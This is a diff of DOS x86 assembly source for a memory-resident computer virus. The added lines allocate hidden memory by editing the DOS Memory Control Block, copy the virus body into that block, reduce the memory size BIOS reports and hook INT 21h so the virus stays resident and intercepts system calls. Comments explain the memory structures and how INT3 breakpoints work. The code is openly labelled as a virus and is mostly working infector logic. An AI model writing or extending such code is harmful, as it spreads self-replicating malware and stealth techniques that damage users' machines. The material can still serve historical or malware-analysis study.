@@ -27,6 +27,9 @@ je VIRUS_ALREADY_INSTALLED
 mov ax, ds
 dec ax
 mov es, ax ;get MCB
+;----------------------------------------------------------------------------
+;MCB - DOS Memory Control Block Format
+;----------------------------------------------------------------------------
 ;ffset Size      Description
 ; 00   byte   'M' 4Dh  member of a MCB chain, (not last)
 ;            'Z' 5Ah  indicates last entry in MCB chain
@@ -51,12 +54,53 @@ mov es, ax ;get MCB
 ;                    technically isn't
 cmp byte ptr es:[0],'Z' ;is it the last MCB in the chain ?
 jne CANNOT_INSTALL
+mov bx, es:[3] ;get block size
+sub bx, ((offset END_OF_CODE-offset START+15)/16)+1 ;compute new block size in paragraphs
+push ds
+pop es
+mov ah, 4Ah ;resize memory block
+int 21h
+; ALLOCATE MEMORY 
+mov ah, 48h ;allocate memory for the virus
+mov bx, (offset END_OF_CODE - offset START+15)/16 ;16BITS
+int 21h ;AX will contain segment of allocated block
+; UPDATE MCB 
+dec ax 
+mov es, ax ;get MCB ES - extra segment register, it's up to a coder to define its usage.
+mov byte ptr [es:[0]], 'Z' ;mark MCB as last in chain
+mov word ptr [es:[1]], 8 ;mark DOS as owner of memory block
+inc ax
+mov es, ax ;get memory block
+xor di, di ;destination address
+lea si, bp+START ;start of virus code in memory
+mov cx, offset END_OF_CODE-offset START
+cld;clears the direction flag. This tells the 8086 that it must increment the SI and DI register after each iteration
+rep movsb ;copy virus
+int 3h;INT 3 causes an interrupt and calls an interrupt vector set up by the OS=DOS
+;When active the debugger sets his own interrupt handler for INT3 in the system. 
+;Any call to INT3 will cause the running program to *break* (stop execution) and branch out execution to the debugger's INT3 handler.
+; After some basic state saving, the INT3 handler usually yields the control to the debugger GUI. 
+;When you want to debug a program, debugger loads the program code and if available it's source code in memory. 
+;Then the programmer goes and sets breakpoint using the source code. 
+;If the program is compiled with debug code, debugger easily locates the assembly instruction generated for the marked source code line. 
+;Then it saves this instruction into some memory and replaces it with INT3. This code is restored back after INT3 is invoked.
+;This was a powerful mechanism back in the days for debugging and also cracking programs. 
+;One could easily write a TSR (Terminate and Stay Resident) in DOS for handling INT3 then place an INT3 in the code which he wants to patch.
 
-
-
-
-
-
+push es
+pop ds ;make DS = segment of newly allocated block
+mov ax, 40h
+mov es, ax ;get BIOS segment
+sub word ptr [es:[13h]], (offset END_OF_CODE-offset START+1023)/1024
+;reduce available memory    
+; INSTALL NEW ISR FOR INT 21h 
+mov al, nISRNumber
+lea si, dwOldExecISR-100h
+lea dx, NewDosISR-100h
+call HookISR
+;  UPDATE CALL INSTRUCTION IN NewExecISR 
+mov ds:[dwOldExecISRVariable-100h],si ;update CALL FAR CS:[xxxx] instruction
+;in PROC NewDOSISR
 CANNOT_INSTALL:
 VIRUS_ALREADY_INSTALLED:
 ;TRANSFER CONTROL TO HOST PROGRAM 
